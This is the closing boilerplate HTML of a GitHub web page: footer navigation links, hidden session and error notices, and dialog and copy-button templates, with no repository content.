        <a aria-label="Homepage" title="GitHub" class="footer-octicon mr-2" href="https://github.com">
          <svg aria-hidden="true" height="24" viewBox="0 0 16 16" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
</svg>
</a>        <span>
        &copy; 2023 GitHub, Inc.
        </span>
      </div>
    </div>

    <nav aria-label='footer' class="col-12 col-lg-8">
      <h3 class='sr-only' id='sr-footer-heading'>Footer navigation</h3>
      <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0" aria-labelledby='sr-footer-heading'>
          <li class="mr-3 mr-lg-0"><a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}">Terms</a></li>
          <li class="mr-3 mr-lg-0"><a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}">Privacy</a></li>
          <li class="mr-3 mr-lg-0"><a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security">Security</a></li>
          <li class="mr-3 mr-lg-0"><a href="https://www.githubstatus.com/" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}">Status</a></li>
          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to help, text:Docs" href="https://docs.github.com">Docs</a></li>
          <li class="mr-3 mr-lg-0"><a href="https://support.github.com?tags=dotcom-footer" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}">Contact GitHub</a></li>
          <li class="mr-3 mr-lg-0"><a href="https://github.com/pricing" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Pricing&quot;,&quot;label&quot;:&quot;text:Pricing&quot;}">Pricing</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://docs.github.com" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to api&quot;,&quot;label&quot;:&quot;text:api&quot;}">API</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://services.github.com" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to training&quot;,&quot;label&quot;:&quot;text:training&quot;}">Training</a></li>
          <li class="mr-3 mr-lg-0"><a href="https://github.blog" data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to blog&quot;,&quot;label&quot;:&quot;text:blog&quot;}">Blog</a></li>
          <li><a data-ga-click="Footer, go to about, text:about" href="https://github.com/about">About</a></li>
      </ul>
    </nav>
  </div>

  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 color-fg-muted"></span>
  </div>
</footer>




  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You can’t perform that action at this time.
  </div>

  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden
    >
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>

    <div id="js-global-screen-reader-notice" class="sr-only" aria-live="polite" ></div>
  </body>
</html>

